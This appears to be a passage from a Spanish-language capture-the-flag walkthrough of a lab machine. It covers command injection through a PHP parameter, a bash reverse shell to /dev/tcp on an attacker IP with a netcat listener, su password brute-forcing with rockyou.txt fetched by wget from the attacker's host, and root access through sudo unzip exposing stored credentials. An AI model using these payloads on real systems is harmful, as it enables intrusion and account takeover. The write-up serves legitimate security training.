URL = http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?cmd=whoami&72e22dffd7fa10883a85aa3e0bbbd6d4=php://...
```

Info:

```
www-data
�
P�����
```

Vemos que esta funcionando, por lo que vamos a generarnos una `reverse shell` de esta forma.

```
URL = http://<IP_VICTIM>/061400ca5d384de48f37a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev/file.php?cmd=bash%20-c%20"bash%20-i%20>%26%20/dev/tcp/192.168.177.129/7777 0>%261"&72e22dffd7fa10883a85aa3e0bbbd6d4=php://...
```

Antes de enviarlo nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si lo enviamos con `BurpSuite` poniendole en la cabecera el `Statusid: 1` y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.177.129] from (UNKNOWN) [172.17.0.2] 53932
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
<a71ec23cc518/cc8e38c20e4e2f58291c0f8b2e3ace5f/dev$ whoami
whoami
www-data
```

Vemos que ha funcionado, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user baluton

Si buscamos en todo el sistema no veremos nada interesante, por lo que como ultimo recurso vamos a probar a realizar fuerza bruta con el usuario `balutin` utilizando un script y pasarnos el diccionario `rockyou.txt`.

URL = [Download GitHub suBruteforce.sh](https://github.com/D1se0/suBruteforce/blob/main/suBruteforceBash/suBruteforce.sh)

Vamos a pasarnos dicho archivo a la carpeta `/tmp`, una vez que lo hayamos echo le daremos permisos de ejecuccion de esta forma:

```shell
cd /tmp
chmod +x suBruteforce.sh
```

Y vamos a pasarnos el diccionario desde el `host`.

```shell
cp /usr/share/wordlists/rockyou.txt rockyou.txt
python3 -m http.server 80
```

Ahora desde la maquina victima haremos lo siguiente:

```shell
wget http://<IP_ATTACKER>/rockyou.txt
```

Una vez que nos hayamos pasado todo, lo ejecutaremos de esta forma:

```shell
./suBruteforce.sh baluton rockyou.txt
```

Info:

```
[+] Contraseña encontrada para el usuario baluton:123123
```

Vemos que ha funcionado, por lo que nos cambiaremos a dicho usuario.

```shell
su baluton
```

Metemos como contraseña `123123` y veremos que seremos dicho usuario.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for baluton on 3d3d44c146ca:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User baluton may run the following commands on 3d3d44c146ca:
    (ALL) NOPASSWD: /usr/bin/unzip
```

Vemos que podemos ejecutar el binario `unzip` como el usuario `root`.

Pero si probamos a descubrir la contraseña del otro usuario llamado `redghost` tambien la encontraremos:

```shell
./suBruteforce.sh redghost rockyou.txt
```

Info:

```
[+] Contraseña encontrada para el usuario redghost:estrella
```

Si cambiamos a dicho usuario, tambien nos funcionara, pero no veremos nada interesante, por lo que vamos a realizar un `fuzzing` con los `2` usuario a ver que encontramos.

Pero si listamos la raiz (`/`) veremos el siguiente archivo.

```
-rw-------   1 root root  230 Jun 23 16:27 secretitosecretazo.zip
```

Vamos a descomprimirlo con el `sudo` que tenemos de `unzip` de esta forma:

```shell
sudo unzip /secretitosecretazo.zip
```

Info:

```
Archive:  /secretitosecretazo.zip
  inflating: regalitoregalazoregalin.txt
```

Veremos que nos dejo un archivo llamado `regalitoregalazoregalin.txt` si lo leemos veremos lo siguiente:

```
root:balulonbalulinbalutonjeje
```

Por lo que vamos a probar si fueran las credenciales de `root`.

```shell
su root
```

Metemos como contraseña `balulonbalulinbalutonjeje`...

Info:

```
root@3d3d44c146ca:/tmp# whoami
root
```

Veremos que ha funcionado, por lo que ya seremos el usuario `root` y habremos terminado la maquina.
